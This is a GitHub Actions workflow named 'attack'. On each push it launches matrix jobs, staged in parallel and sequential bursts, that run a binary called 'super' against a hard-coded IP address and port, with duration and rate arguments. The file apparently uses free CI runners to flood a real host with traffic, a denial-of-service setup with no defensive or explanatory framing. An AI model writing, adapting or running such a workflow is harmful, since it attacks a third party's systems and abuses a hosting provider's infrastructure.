name: attack
on: [push]

jobs:
  stage-0:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5]
    steps:
      - uses: actions/checkout@v3
      - run: chmod +x super
      - run: ./super 34.4.24.115 23396 10 1000

  stage-1:
    needs: stage-0
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5]
    steps:
      - uses: actions/checkout@v3
      - run: chmod +x super
      - run: ./super 34.4.24.115 23396 120 1000

  stage-2-calc:
    runs-on: ubuntu-latest
    outputs:
      matrix_list: ${{ steps.calc.outputs.matrix_list }}
    steps:
      - id: calc
        run: |
          NUM_JOBS=$((120 / 10))
          ARRAY=$(seq 1 $NUM_JOBS | jq -R . | jq -s -c .)
          echo "matrix_list=$ARRAY" >> $GITHUB_OUTPUT

  stage-2-sequential:
    needs: [stage-0, stage-2-calc]
    runs-on: ubuntu-22.04
    strategy:
      max-parallel: 1
      matrix:
        iteration: ${{ fromJson(needs.stage-2-calc.outputs.matrix_list) }}
    steps:
      - uses: actions/checkout@v3
      - name: Sequential Burst
        run: |
          chmod +x super
          ./super 34.4.24.115 23396 10 1000
